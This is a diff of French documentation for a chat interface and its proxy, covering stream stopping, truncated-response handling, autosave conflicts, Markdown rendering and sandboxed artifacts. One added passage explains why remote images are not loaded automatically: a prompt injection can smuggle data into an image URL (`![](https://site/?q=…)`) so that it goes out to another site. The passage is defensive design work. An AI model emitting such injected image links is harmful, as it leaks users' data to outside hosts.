@@ -22,7 +22,22 @@ ses outils, ses artifacts et ses fichiers produits.
   nomme la conversation affichée (`/ui#chat/<id>`) : un rechargement la
   rouvre, lue en même temps que la première page du menu.
 - Dans le fil : modifier une question (la suite repart d'elle),
-  régénérer la dernière réponse, arrêter un flux.
+  régénérer la dernière réponse, arrêter un flux. *Arrêter* coupe aussi
+  l'outil de la page en cours (un bac JavaScript, PHP ou SQL est supprimé
+  aussitôt) ; ses appels restants reçoivent un résultat d'erreur.
+- **Réponse coupée** : une réponse arrêtée par la limite de tokens du
+  modèle (`finish_reason: length`), ou dont le flux s'est fermé sans
+  `[DONE]`, le dit sous elle, avec *Continuer* (un message qui demande la
+  suite). Une page rechargée pendant une réponse la retrouve marquée
+  « interrompue », ses outils en cours en erreur : *Reprendre* relance le
+  modèle sur le même message.
+- **Enregistrement** : au plus une fois par seconde, toutes les 5 s
+  pendant un flux, et tout de suite quand l'onglet est caché (requête
+  `keepalive`, qui survit à sa fermeture). Chaque conversation a une
+  **révision** tenue par le proxy : un onglet qui enregistre par-dessus
+  une version plus récente (autre onglet, autre appareil) reçoit 409 au
+  lieu d'écraser. Un bandeau propose alors *Reprendre l'autre version*
+  ou *Garder celle-ci* ; rien n'est enregistré avant ce choix.
 - **Export** Markdown (⤓ dans le menu, ou *Réglages*) : titre, date,
   modèle, prompt système, messages, fichiers texte joints, sources, et
   images en data URL. Le raisonnement n'y est pas.
@@ -213,7 +228,10 @@ vider le champ, annule la modification.
 **Rendu Markdown** : titres, listes, tableaux, citations, code avec
 *Copier*, liens et images. Tout le texte est échappé : aucun HTML du
 modèle ne passe. Seuls `http(s)`, `mailto` et les chemins du proxy
-(`/v1/files/…`) font un lien.
+(`/v1/files/…`) font un lien. Une image du proxy s'affiche ; une image
+d'un **autre site** devient un bouton *Afficher l'image (hôte)* : la
+charger d'office suffirait à envoyer à ce site ce qu'une injection de
+prompt aurait glissé dans son adresse (`![](https://site/?q=…)`).
 
 **Raisonnement** : plié par défaut au-dessus de la réponse. Plié, il
 montre une seule phrase complète, renouvelée au plus toutes les 1,8 s
@@ -469,7 +487,8 @@ html-to-image, servi par le proxy : rien n'est chargé d'ailleurs.
 
 Un artifact est **isolé** : cadre `sandbox` sans `allow-same-origin`,
 sans accès à la page, à sa session ni à ses clés. Sa politique de
-contenu autorise les scripts et styles en ligne et les bibliothèques de
+contenu, posée en tête de son document avant le moindre octet de
+l'artifact (chat/artifacts.js), autorise les scripts et styles en ligne et les bibliothèques de
 cdnjs, jsdelivr ou unpkg. **Aucune autre requête réseau** : ni `fetch`,
 ni image distante, ni formulaire.
 
